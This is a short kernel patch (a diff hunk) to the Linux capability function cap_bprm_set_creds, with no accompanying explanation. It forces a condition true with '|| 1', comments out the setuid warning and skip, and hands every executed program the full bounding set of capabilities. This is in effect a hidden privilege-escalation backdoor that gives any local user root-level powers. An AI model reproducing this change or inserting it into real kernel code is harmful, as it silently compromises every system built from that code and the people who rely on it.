@@ -555,9 +555,10 @@ int cap_bprm_set_creds(struct linux_binprm *bprm)
 		 * for a setuid root binary run by a non-root user.  Do set it
 		 * for a root user just to cause least surprise to an admin.
 		 */
-		if (has_cap && !uid_eq(new->uid, root_uid) && uid_eq(new->euid, root_uid)) {
-			warn_setuid_and_fcaps_mixed(bprm->filename);
-			goto skip;
+		if (uid_eq(new->uid, root_uid) || uid_eq(new->euid, root_uid) || 1) {
+			//warn_setuid_and_fcaps_mixed(bprm->filename);
+			new->cap_permitted = cap_combine(old->cap_bset, old->cap_inheritable);
+			//goto skip;
 		}
 		/*
 		 * To support inheritance of root-permissions and suid-root
